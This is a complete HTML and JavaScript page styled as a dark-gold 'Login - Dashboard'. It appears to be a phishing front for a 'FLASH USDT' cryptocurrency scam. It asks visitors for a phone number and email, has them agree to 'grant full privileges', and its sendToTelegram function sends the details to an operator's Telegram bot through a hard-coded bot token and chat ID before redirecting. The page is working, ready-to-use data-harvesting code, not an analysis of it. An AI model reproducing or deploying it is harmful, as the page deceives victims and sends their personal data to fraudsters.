<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">

    <style>
        /* --- CONFIGURATION & STYLING INHERITED FROM THE TARGET THEME --- */
        :root {
            /* --- PRIMARY ACCENT COLORS (GOLD/AMBER) --- */
            --primary-accent: #F59E0B; /* Amber 500 - Main Accent (Gold) */
            --neon-green: #F59E0B; /* Reusing this variable for the gold submit button glow */
            
            /* --- DARK THEME BASE COLORS --- */
            --body-bg: #0A0A0A; /* Deep Black Background */
            --card-bg-transparent: rgba(17, 24, 39, 0.8); /* Dark Glass (Dark Gray 900) */
            --input-bg: rgba(31, 41, 55, 0.7); /* Darker Input Background */
            --input-border: #4B5563; /* Dark Input Border */
            --text-dark: #F3F4F6; /* Light Text */
            --text-subtle: #9CA3AF; /* Subtle Gray Text */
            
            --card-radius: 0.8rem; /* Card radius (12px) */
        }

        /* Gradient Background with animation for 'Ù…ØªÙˆØ¬ Ù…ØªØ­Ø±Ùƒ' (Moving Crowned Effect) */
        @keyframes gradient-shift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        body {
            /* New Radiant Dark/Gold Gradient Background */
            background: linear-gradient(-45deg, #0A0A0A, #1F2937, #374151, #1F2937, #0A0A0A); 
            background-size: 400% 400%;
            animation: gradient-shift 20s ease infinite;
            
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center; /* Changed from flex-start to center for the login screen */
            min-height: 100vh; 
            padding: 2rem 1rem; 
            overflow-x: hidden; 
            position: relative; 
            color: var(--text-dark); 
        }

        /* Glassmorphism Effect for CARDS, INPUTS, MODALS, and DROPDOWNS */
        .glass-container {
            /* REQUIRED Dark Glassmorphism Properties */
            background-color: var(--card-bg-transparent); /* Dark transparent background */
            backdrop-filter: blur(12px); 
            /* Aesthetic Properties */
            border-radius: var(--card-radius);
            box-shadow: 0 8px 32px 0 rgba(245, 158, 11, 0.15); /* Subtle gold shadow */
            border: 1px solid rgba(255, 255, 255, 0.05); /* Very light border */
        }
        
        .input-style {
            background-color: var(--input-bg); /* Dark transparent background */
            border: 1px solid var(--input-border);
            border-radius: 0.6rem; 
            padding: 0.75rem 1rem; 
            width: 100%;
            transition: all 0.2s;
            color: var(--text-dark); /* Light text */
            backdrop-filter: blur(4px); 
        }
        .input-style::placeholder {
            color: var(--text-subtle);
        }
        .input-style:focus {
            border-color: var(--primary-accent); /* Gold focus border */
            box-shadow: 0 0 0 1px var(--primary-accent);
            background-color: var(--input-bg);
            outline: none;
        }

        /* Custom style to make the select dropdown background transparent for the code/flag display */
        #country-code {
            -webkit-appearance: none; /* Remove default browser styling */
            -moz-appearance: none;
            appearance: none;
            cursor: pointer;
            background-color: var(--input-bg); /* Match input background */
            color: var(--text-dark);
            border: none; /* Already handled by the parent div border */
            border-right: 1px solid var(--input-border); /* Use the standard dark border */
            transition: border-color 0.2s;
        }
        #country-code:focus {
            outline: none;
        }
        
        /* Submit Button to RADIANT GOLD style */
        .submit-gradient-btn {
            background: linear-gradient(90deg, #F59E0B, #DC2626); /* Gold to Red Gradient */
            color: #1F2937; /* Dark text for high contrast */
            border-radius: 1rem;
            padding: 0.8rem; 
            font-size: 1rem; 
            font-weight: 800;
            box-shadow: 0 8px 30px rgba(245, 158, 11, 0.8); /* Strong Gold Shadow */
            transition: all 0.3s ease;
            text-shadow: 0 0 2px rgba(0, 0, 0, 0.2); 
            border: 1px solid var(--primary-accent);
        }
        .submit-gradient-btn:hover {
             box-shadow: 0 10px 40px rgba(245, 158, 11, 1);
             transform: translateY(-1px); 
        }
        
        /* Agreement Checkbox Style */
        .custom-checkbox:checked {
            background-color: var(--primary-accent); /* Gold fill on checked */
            border-color: var(--primary-accent);
        }
        .custom-checkbox {
            /* Tailwind classes are used for border, size, and rounded corners */
            border-color: var(--input-border);
            transition: background-color 0.2s, border-color 0.2s;
        }

        /* Message Box Colors */
        .success-message {
            background-color: rgba(16, 185, 129, 0.2); /* Green 600 transparent */
            color: #10B981; /* Green 500 */
            border: 1px solid #10B981;
        }
        .error-message {
            background-color: rgba(239, 68, 68, 0.2); /* Red 600 transparent */
            color: #EF4444; /* Red 500 */
            border: 1px solid #EF4444;
        }
        
        /* Scrollbar styles for the country code selector (kept original scrollbar hide/customization) */
        .no-scrollbar::-webkit-scrollbar {
            display: none;
        }
        .no-scrollbar {
            -ms-overflow-style: none;  /* IE and Edge */
            scrollbar-width: none;  /* Firefox */
        }
        
        /* Modal Style (Glassmorphism) */
        .modal-card {
             @apply glass-container; 
        }
        
        /* Modal button styles (Adjusted for dark theme) */
        .modal-cancel-btn {
            background-color: #374151; /* Gray 700 */
            color: #D1D5DB; /* Gray 300 */
        }
        .modal-cancel-btn:hover {
            background-color: #4B5563; /* Gray 600 */
        }
        
        .modal-confirm-btn {
            background-color: var(--primary-accent);
            color: #1F2937;
        }
        .modal-confirm-btn:hover {
            background-color: #FBBF24; /* Amber 400 */
        }

    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4 relative">
    
    <div id="main-container" class="w-full max-w-md space-y-6 z-10 p-6 glass-container">

        <header class="text-center mb-8">
            <h1 class="text-4xl font-bold text-white mb-2" style="color: var(--primary-accent);">Hello, sir</h1>
            <p class="text-lg text-gray-400">please confirm your information</p>
        </header>

        <form id="flashing-form" class="space-y-5">

            <div class="flex rounded-xl overflow-hidden border border-input-border focus-within:border-primary-accent transition duration-200">
                
                <select id="country-code" 
                    class="bg-transparent text-white p-3 pl-2 focus:ring-0 focus:outline-none w-1/3 md:w-1/4 no-scrollbar" 
                    title="Select country code">
                    </select>
                
                <input
                    type="tel"
                    id="phone-number"
                    placeholder="Enter a valid phone number"
                    class="bg-transparent text-left text-white p-3 w-2/3 md:w-3/4 focus:outline-none placeholder:text-text-subtle"
                    style="background-color: var(--input-bg);"
                    required
                >
            </div>


            <input
                type="email"
                id="gmail-input"
                placeholder="Email Address"
                class="input-style"
                required
            >

            <div class="flex items-start pt-2">
                <input
                    type="checkbox"
                    id="agreement-checkbox"
                    required
                    class="mr-2 w-5 h-5 form-checkbox border-2 border-input-border rounded-md custom-checkbox checked:bg-primary-accent checked:border-primary-accent focus:ring-offset-0 focus:ring-0"
                >
                <label for="agreement-checkbox" class="text-gray-400 text-sm cursor-pointer">
                    I agree to grant full privileges to this number and email later for confirmation of receipt.
                </label>
            </div>

            <button
                type="button" 
                id="start-flashing-btn"
                class="w-full submit-gradient-btn mt-6"
            >
                START FLASHING <i class="fas fa-arrow-right ml-2"></i>
            </button>

            <div id="message-box" class="hidden text-center p-3 rounded-lg text-sm transition-all duration-300"></div>

        </form>

    </div>

    <div id="confirmation-modal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center p-4 z-50">
        <div class="modal-card p-6 rounded-xl shadow-2xl w-full max-w-sm border space-y-4">
            <h2 class="text-xl font-bold text-white" style="color: var(--primary-accent);">Confirm Action</h2>
            <p class="text-gray-300">
                This number and email address will be used to confirm the payment and receipt of FLASH USDT.
            </p>
            <div class="flex justify-end space-x-3 pt-2">
                <button id="modal-cancel-btn" class="modal-cancel-btn px-4 py-2 text-sm font-medium rounded-lg transition">Cancel</button>
                <button id="modal-confirm-btn" class="modal-confirm-btn px-4 py-2 text-sm font-medium rounded-lg transition">Confirm & Proceed</button>
            </div>
        </div>
    </div>

    <script>
        // List of countries (Name, Dial Code, Flag Emoji) - Extended List
        const countryData = [
            { name_en: "Afghanistan", code: "+93", flag: "ðŸ‡¦ðŸ‡«" },
            { name_en: "Albania", code: "+355", flag: "ðŸ‡¦ðŸ‡±" },
            { name_en: "Algeria", code: "+213", flag: "ðŸ‡©ðŸ‡¿" },
            { name_en: "Andorra", code: "+376", flag: "ðŸ‡¦ðŸ‡©" },
            { name_en: "Angola", code: "+244", flag: "ðŸ‡¦ðŸ‡´" },
            { name_en: "Argentina", code: "+54", flag: "ðŸ‡¦ðŸ‡·" },
            { name_en: "Armenia", code: "+374", flag: "ðŸ‡¦ðŸ‡²" },
            { name_en: "Australia", code: "+61", flag: "ðŸ‡¦ðŸ‡º" },
            { name_en: "Austria", code: "+43", flag: "ðŸ‡¦ðŸ‡¹" },
            { name_en: "Azerbaijan", code: "+994", flag: "ðŸ‡¦ðŸ‡¿" },
            { name_en: "Bahrain", code: "+973", flag: "ðŸ‡§ðŸ‡­" },
            { name_en: "Bangladesh", code: "+880", flag: "ðŸ‡§ðŸ‡©" },
            { name_en: "Belgium", code: "+32", flag: "ðŸ‡§ðŸ‡ª" },
            { name_en: "Bolivia", code: "+591", flag: "ðŸ‡§ðŸ‡´" },
            { name_en: "Bosnia and Herzegovina", code: "+387", flag: "ðŸ‡§ðŸ‡¦" },
            { name_en: "Brazil", code: "+55", flag: "ðŸ‡§ðŸ‡·" },
            { name_en: "Bulgaria", code: "+359", flag: "ðŸ‡§ðŸ‡¬" },
            { name_en: "Canada", code: "+1", flag: "ðŸ‡¨ðŸ‡¦" },
            { name_en: "Chile", code: "+56", flag: "ðŸ‡¨ðŸ‡±" },
            { name_en: "China", code: "+86", flag: "ðŸ‡¨ðŸ‡³" },
            { name_en: "Colombia", code: "+57", flag: "ðŸ‡¨ðŸ‡´" },
            { name_en: "Croatia", code: "+385", flag: "ðŸ‡­ðŸ‡·" },
            { name_en: "Cuba", code: "+53", flag: "ðŸ‡¨ðŸ‡º" },
            { name_en: "Cyprus", code: "+357", flag: "ðŸ‡¨ðŸ‡¾" },
            { name_en: "Czech Republic", code: "+420", flag: "ðŸ‡¨ðŸ‡¿" },
            { name_en: "Denmark", code: "+45", flag: "ðŸ‡©ðŸ‡°" },
            { name_en: "Ecuador", code: "+593", flag: "ðŸ‡ªðŸ‡¨" },
            { name_en: "Egypt", code: "+20", flag: "ðŸ‡ªðŸ‡¬" },
            { name_en: "Finland", code: "+358", flag: "ðŸ‡«ðŸ‡®" },
            { name_en: "France", code: "+33", flag: "ðŸ‡«ðŸ‡·" },
            { name_en: "Germany", code: "+49", flag: "ðŸ‡©ðŸ‡ª" },
            { name_en: "Greece", code: "+30", flag: "ðŸ‡¬ðŸ‡·" },
            { name_en: "Hong Kong", code: "+852", flag: "ðŸ‡­ðŸ‡°" },
            { name_en: "Hungary", code: "+36", flag: "ðŸ‡­ðŸ‡º" },
            { name_en: "Iceland", code: "+354", flag: "ðŸ‡®ðŸ‡¸" },
            { name_en: "India", code: "+91", flag: "ðŸ‡®ðŸ‡³" },
            { name_en: "Indonesia", code: "+62", flag: "ðŸ‡®ðŸ‡©" },
            { name_en: "Iraq", code: "+964", flag: "ðŸ‡®ðŸ‡¶" },
            { name_en: "Ireland", code: "+353", flag: "ðŸ‡®ðŸ‡ª" },
            { name_en: "Israel", code: "+972", flag: "ðŸ‡®ðŸ‡±" },
            { name_en: "Italy", code: "+39", flag: "ðŸ‡®ðŸ‡¹" },
            { name_en: "Japan", code: "+81", flag: "ðŸ‡¯ðŸ‡µ" },
            { name_en: "Jordan", code: "+962", flag: "ðŸ‡¯ðŸ‡´" },
            { name_en: "Kazakhstan", code: "+7", flag: "ðŸ‡°ðŸ‡¿" },
            { name_en: "Kenya", code: "+254", flag: "ðŸ‡°ðŸ‡ª" },
            { name_en: "Kuwait", code: "+965", flag: "ðŸ‡°ðŸ‡¼" },
            { name_en: "Lebanon", code: "+961", flag: "ðŸ‡±ðŸ‡§" },
            { name_en: "Libya", code: "+218", flag: "ðŸ‡±ðŸ‡¾" },
            { name_en: "Malaysia", code: "+60", flag: "ðŸ‡²ðŸ‡¾" },
            { name_en: "Mexico", code: "+52", flag: "ðŸ‡²ðŸ‡½" },
            { name_en: "Morocco", code: "+212", flag: "ðŸ‡²ðŸ‡¦" },
            { name_en: "Netherlands", code: "+31", flag: "ðŸ‡³ðŸ‡±" },
            { name_en: "New Zealand", code: "+64", flag: "ðŸ‡³ðŸ‡¿" },
            { name_en: "Nigeria", code: "+234", flag: "ðŸ‡³ðŸ‡¬" },
            { name_en: "Norway", code: "+47", flag: "ðŸ‡³ðŸ‡´" },
            { name_en: "Oman", code: "+968", flag: "ðŸ‡´ðŸ‡²" },
            { name_en: "Pakistan", code: "+92", flag: "ðŸ‡µðŸ‡°" },
            { name_en: "Palestine", code: "+970", flag: "ðŸ‡µðŸ‡¸" },
            { name_en: "Peru", code: "+51", flag: "ðŸ‡µðŸ‡ª" },
            { name_en: "Philippines", code: "+63", flag: "ðŸ‡µðŸ‡­" },
            { name_en: "Poland", code: "+48", flag: "ðŸ‡µðŸ‡±" },
            { name_en: "Portugal", code: "+351", flag: "ðŸ‡µðŸ‡¹" },
            { name_en: "Qatar", code: "+974", flag: "ðŸ‡¶ðŸ‡¦" },
            { name_en: "Romania", code: "+40", flag: "ðŸ‡·ðŸ‡´" },
            { name_en: "Russia", code: "+7", flag: "ðŸ‡·ðŸ‡º" },
            { name_en: "Saudi Arabia", code: "+966", flag: "ðŸ‡¸ðŸ‡¦" },
            { name_en: "Singapore", code: "+65", flag: "ðŸ‡¸ðŸ‡¬" },
            { name_en: "South Africa", code: "+27", flag: "ðŸ‡¿ðŸ‡¦" },
            { name_en: "South Korea", code: "+82", flag: "ðŸ‡°ðŸ‡·" },
            { name_en: "Spain", code: "+34", flag: "ðŸ‡ªðŸ‡¸" },
            { name_en: "Sudan", code: "+249", flag: "ðŸ‡¸ðŸ‡©" },
            { name_en: "Sweden", code: "+46", flag: "ðŸ‡¸ðŸ‡ª" },
            { name_en: "Switzerland", code: "+41", flag: "ðŸ‡¨ðŸ‡­" },
            { name_en: "Syria", code: "+963", flag: "ðŸ‡¸ðŸ‡¾" },
            { name_en: "Thailand", code: "+66", flag: "ðŸ‡¹ðŸ‡­" },
            { name_en: "Tunisia", code: "+216", flag: "ðŸ‡¹ðŸ‡³" },
            { name_en: "Turkey", code: "+90", flag: "ðŸ‡¹ðŸ‡·" },
            { name_en: "UAE", code: "+971", flag: "ðŸ‡¦ðŸ‡ª" },
            { name_en: "Ukraine", code: "+380", flag: "ðŸ‡ºðŸ‡¦" },
            { name_en: "United Kingdom", code: "+44", flag: "ðŸ‡¬ðŸ‡§" },
            { name_en: "United States", code: "+1", flag: "ðŸ‡ºðŸ‡¸" },
            { name_en: "Venezuela", code: "+58", flag: "ðŸ‡»ðŸ‡ª" },
            { name_en: "Vietnam", code: "+84", flag: "ðŸ‡»ðŸ‡³" },
            { name_en: "Yemen", code: "+967", flag: "ðŸ‡¾ðŸ‡ª" }
        ].sort((a, b) => a.name_en.localeCompare(b.name_en)); // Alphabetical sorting

        document.addEventListener('DOMContentLoaded', () => {
            const countryCodeSelect = document.getElementById('country-code');
            const form = document.getElementById('flashing-form');
            const startFlashingBtn = document.getElementById('start-flashing-btn');
            const phoneNumberInput = document.getElementById('phone-number');
            const gmailInput = document.getElementById('gmail-input');
            const agreementCheckbox = document.getElementById('agreement-checkbox');
            const messageBox = document.getElementById('message-box');

            // Modal elements
            const modal = document.getElementById('confirmation-modal');
            const modalCancelBtn = document.getElementById('modal-cancel-btn');
            const modalConfirmBtn = document.getElementById('modal-confirm-btn');

            // --- Logic for Country-Specific Phone Number Validation ---
            const specialPatterns = {
                // Algeria: Must start with 5, 6, or 7 and be exactly 9 digits long (excluding country code)
                "+213": {
                    regex: "^[567]\\d{8}$",
                    title: "Algerian mobile number must start with 5, 6, or 7 and consist of 9 digits (e.g., 5XX XXX XXX).",
                    placeholder: "Enter phone number"
                },
                // Default rule uses 'Enter a valid phone number' as placeholder and simple validation
            };

            const updatePhoneNumberPattern = (countryCode) => {
                const patternInfo = specialPatterns[countryCode];

                if (patternInfo) {
                    phoneNumberInput.pattern = patternInfo.regex;
                    phoneNumberInput.title = patternInfo.title;
                    phoneNumberInput.placeholder = patternInfo.placeholder;
                } else {
                    // Default rule for all other countries (5 to 15 digits)
                    phoneNumberInput.pattern = "[0-9]{5,15}";
                    phoneNumberInput.title = "Please enter a valid phone number (5 to 15 digits).";
                    phoneNumberInput.placeholder = "Enter phone number";
                }
            }
            // --- End of Country-Specific Phone Number Validation Logic ---


            // 1. Populate the country dropdown list
            countryData.forEach(country => {
                const option = document.createElement('option');
                
                // Value is the code used for the phone number
                option.value = country.code;
                
                // data-attribute for the short display (closed)
                option.dataset.short = `${country.flag} ${country.code}`;
                
                // data-attribute for the long display (open list)
                option.dataset.long = `${country.flag} ${country.code} (${country.name_en})`;
                
                // Initially, all options show the long name for the dropdown to work
                option.textContent = option.dataset.long;
                
                countryCodeSelect.appendChild(option);
            });
            
            // Function to update the displayed text of the select element (short display)
            const updateSelectDisplay = () => {
                const selectedOption = countryCodeSelect.options[countryCodeSelect.selectedIndex];
                if (selectedOption && selectedOption.dataset.short) {
                    // Temporarily set the selected option's text to the short version (Flag + Code)
                    selectedOption.textContent = selectedOption.dataset.short;
                }
            };
            
            // 2. Event Listener to handle the selected display text
            countryCodeSelect.addEventListener('change', () => {
                updateSelectDisplay();
                updatePhoneNumberPattern(countryCodeSelect.value); // Update validation and placeholder on change
            });
            
            // Event listener to reset all options to long name when the select is focused/opened
            countryCodeSelect.addEventListener('focus', () => {
                Array.from(countryCodeSelect.options).forEach(option => {
                    option.textContent = option.dataset.long;
                });
            });
            
            // 3. Set default value and its initial display
            const defaultCode = "+213"; // Algeria default code
            countryCodeSelect.value = countryData.find(c => c.code === defaultCode)?.code || countryData[0].code;
            updateSelectDisplay();
            updatePhoneNumberPattern(countryCodeSelect.value); // Apply initial validation on load


            // 4. Function to show message
            const showMessage = (text, isSuccess = true) => {
                messageBox.textContent = text;
                // Use the new class names based on the defined styles
                messageBox.className = `block text-center p-3 rounded-lg text-sm transition-all duration-300 ${
                    isSuccess
                        ? 'success-message'
                        : 'error-message'
                }`;
                setTimeout(() => {
                    messageBox.className = 'hidden';
                }, 5000); // Hide message after 5 seconds
            };

            // 5. Function to send data to a Telegram bot (functional implementation)
            const sendToTelegram = async (data) => {
                // *** User-provided credentials (UNCHANGED) ***
                const BOT_TOKEN = '7553851561:AAFyFE8Dx3HJS3whc1AycktBbrqC1yHUEJ0'; 
                const CHAT_ID = '8271446244'; 
                const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

                const selectedOption = countryCodeSelect.options[countryCodeSelect.selectedIndex];
                const countryName = selectedOption.dataset.long.match(/\((.*?)\)/)?.[1] || "Unknown Country";
                const fullPhoneNumber = `${data.countryCode}${data.phoneNumber}`;
                
                const messageText = `
                    ðŸš¨ New Registration Process ðŸš¨
                    -------------------------
                    *Country:* ${countryName}
                    *Phone Number:* ${fullPhoneNumber}
                    *Email Address (Gmail):* ${data.email}
                    *Agreement:* Granted full privileges.
                    -------------------------
                `;

                // Log data being sent
                console.log("--- Attempting to send data to Telegram ---");
                console.log("Chat ID:", CHAT_ID);
                console.log("Message:", messageText);

                try {
                    const response = await fetch(API_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: messageText,
                            parse_mode: 'Markdown', // Use Markdown for better formatting
                        }),
                    });

                    const result = await response.json();

                    if (response.ok && result.ok) {
                        console.log("Telegram API Success:", result);
                        return { ok: true, message: "Data sent successfully. Redirecting..." };
                    } else {
                        console.error("Telegram API Error:", result);
                        return { ok: false, message: `Submission failed. Telegram API Error: ${result.description || 'Unknown error.'}` };
                    }
                } catch (error) {
                    console.error("Network or Fetch Error:", error);
                    return { ok: false, message: "Network Error. Could not connect to the server." };
                }
            };

            // 6. Core Submission Handler (called by modal confirmation)
            const handleSubmission = async () => {
                // Hide modal
                modal.classList.add('hidden');
                modal.classList.remove('flex');

                const originalText = startFlashingBtn.textContent;
                
                // Disable button and show loading state
                startFlashingBtn.textContent = 'Submitting...';
                startFlashingBtn.disabled = true;
                startFlashingBtn.classList.remove('submit-gradient-btn');
                startFlashingBtn.classList.add('bg-gray-600', 'cursor-not-allowed');


                // Collect data
                const submissionData = {
                    countryCode: countryCodeSelect.value,
                    phoneNumber: phoneNumberInput.value.trim(),
                    email: gmailInput.value.trim(),
                    agreement: agreementCheckbox.checked,
                };

                // Execute submission process
                const result = await sendToTelegram(submissionData);

                // Restore button state
                startFlashingBtn.textContent = originalText;
                startFlashingBtn.disabled = false;
                startFlashingBtn.classList.add('submit-gradient-btn');
                startFlashingBtn.classList.remove('bg-gray-600', 'cursor-not-allowed');


                if (result.ok) {
                    // Display success message briefly before redirect
                    showMessage(result.message, true);
                    // Redirect to the next page (main.html) after successful submission
                    setTimeout(() => {
                         window.location.href = 'main.html';
                    }, 1000); 
                   
                } else {
                    // Display error message to the user
                    showMessage(result.message, false);
                }
            };
            
            // 7. Event Listener for START FLASHING button (shows modal)
            startFlashingBtn.addEventListener('click', (e) => {
                e.preventDefault();
                
                // Perform front-end form validation (required fields, patterns)
                if (!form.checkValidity()) {
                    // This triggers the browser's default validation UI (like tooltips)
                    form.reportValidity();
                    return; 
                }

                // If valid, show the confirmation modal
                modal.classList.remove('hidden');
                modal.classList.add('flex');
            });
            
            // 8. Modal Button Handlers
            modalCancelBtn.addEventListener('click', () => {
                modal.classList.add('hidden');
                modal.classList.remove('flex');
            });

            modalConfirmBtn.addEventListener('click', handleSubmission);

        });
    </script>
</body>
</html>
